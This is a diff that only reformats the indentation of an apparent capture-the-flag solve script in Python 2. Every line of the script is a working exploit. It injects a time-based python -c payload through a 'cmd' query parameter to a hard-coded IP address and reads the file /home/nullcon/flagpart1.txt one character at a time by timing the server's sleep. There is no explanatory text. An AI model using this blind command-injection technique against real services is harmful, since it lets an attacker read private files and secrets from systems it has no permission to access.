@@ -7,22 +7,22 @@ import unirest
 from time import sleep
 import string
 
-SLEEP_TIME=1.5
+SLEEP_TIME = 1.5
 ans = 'flag{'
 characters = string.ascii_letters + string.digits
 
 for index in range(1, 100):
-	for letter in characters:
-		cmd = '''
-		python -c "__import__('time').sleep({} if open('/home/nullcon/flagpart1.txt').read({})[-1:] == '{}' else 0)"
-	  		'''.format(SLEEP_TIME, index, letter)
+    for letter in characters:
+        cmd = '''
+        python -c "__import__('time').sleep({} if open('/home/nullcon/flagpart1.txt').read({})[-1:] == '{}' else 0)"
+        '''.format(SLEEP_TIME, index, letter)
 
-		start = time.time()
-		response = unirest.get("http://54.89.146.217/?cmd={}".format(quote(cmd, safe='')))
-		end = time.time()
-		elapsed = end - start
+        start = time.time()
+        response = unirest.get("http://54.89.146.217/?cmd={}".format(quote(cmd, safe='')))
+        end = time.time()
+        elapsed = end - start
 
-		if elapsed > SLEEP_TIME:
-			ans += letter
-			print ans + '}'
-			break
+        if elapsed > SLEEP_TIME:
+            ans += letter
+            print ans + '}'
+            break
